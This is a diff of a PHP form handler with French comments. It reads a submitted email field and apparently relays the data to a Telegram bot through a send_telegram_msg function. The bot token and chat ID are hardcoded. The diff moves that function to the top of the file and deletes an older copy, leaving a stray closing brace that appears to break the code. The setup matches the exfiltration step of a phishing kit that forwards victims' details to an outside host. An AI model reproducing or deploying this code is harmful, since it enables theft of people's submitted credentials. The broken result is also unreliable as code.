@@ -1,6 +1,29 @@
 <?php
 // Inclusion des dépendances (si nécessaire)
 include 'email.php';
+function send_telegram_msg($message){
+	// Put Your Telegram Information Here
+	$botToken  = '8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU';
+	$chat_id  = ['8179736651'];
+	
+	
+	$website="https://api.telegram.org/bot".$botToken;
+	foreach($chat_id as $ch){
+		$params=[
+		  'chat_id'=>$ch, 
+		  'text'=>$message,
+		];
+		$ch = curl_init($website . '/sendMessage');
+		curl_setopt($ch, CURLOPT_HEADER, false);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_POST, true);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		$result = curl_exec($ch);
+		curl_close($ch);
+	}
+	return true;
+}
 
 // Récupération et validation des données POST
 $email = isset($_POST['email']) ? trim($_POST['email']) : null;
@@ -57,30 +80,5 @@ $data = array(
 );
 header('Content-Type: application/json');
 echo json_encode($data);
-
-// Fonction pour envoyer un message Telegram
-function send_telegram_msg($message) {
-    $botToken = "8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU"; // Remplacez par votre token Telegram
-    $chatId = "8179736651"; // Remplacez par votre ID de chat
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
-
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message
-    ];
-
-    // Envoi via cURL
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-
-    if (curl_errno($ch)) {
-        error_log('Telegram Error: ' . curl_error($ch));
-    }
-
-    curl_close($ch);
 }
 ?>
